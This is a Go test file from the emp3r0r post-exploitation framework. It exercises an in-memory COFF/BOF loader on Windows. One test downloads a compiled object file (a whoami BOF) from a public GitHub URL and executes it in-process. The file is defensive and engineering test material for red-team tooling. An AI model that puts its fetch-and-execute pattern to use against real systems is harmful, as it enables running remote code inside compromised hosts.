//go:build windows && amd64
// +build windows,amd64

package modules

import (
	"io"
	"net/http"
	"os"
	"strings"
	"testing"

	"github.com/jm33-m0/emp3r0r/core/internal/def"
)

func TestRunCOFFModuleInvalidPayload(t *testing.T) {
	inv := def.ResolvedInvocation{
		Coff: &def.ResolvedCoffInvocation{
			Export: "Run",
			Args:   []def.ResolvedCoffArg{{WireType: "LPSTR", Value: "hello"}},
		},
	}

	// Invalid payload should bubble an error from loader; we just assert it tries to load.
	if _, err := runCOFFModule([]byte("not-a-coff"), inv); err == nil {
		t.Fatalf("expected error for invalid COFF payload")
	}
}

func TestRunCOFFModuleWithRealBOF(t *testing.T) {
	if os.Getenv("EMP3R0R_RACE_ON") == "1" {
		t.Skip("skipped under race run (EMP3R0R_RACE_ON=1)")
	}

	// Non-privileged BOF to avoid admin requirement
	const url = "https://github.com/praetorian-inc/goffloader/raw/refs/heads/main/cmd/bof_example/whoami.x64.o"
	resp, err := http.Get(url)
	if err != nil {
		t.Fatalf("download BOF: %v", err)
	}
	defer resp.Body.Close()

	payload, err := io.ReadAll(resp.Body)
	if err != nil {
		t.Fatalf("read BOF: %v", err)
	}
	if len(payload) == 0 {
		t.Fatalf("downloaded empty BOF payload")
	}

	inv := def.ResolvedInvocation{
		Coff: &def.ResolvedCoffInvocation{ // whoami.x64.o exports main(), no args required
			Export: "main",
			Args:   nil,
		},
	}

	out, err := runCOFFModule(payload, inv)
	if err != nil {
		t.Fatalf("runCOFFModule failed: %v", err)
	}

	if strings.TrimSpace(out) == "" {
		t.Fatalf("unexpected empty BOF output")
	}
}
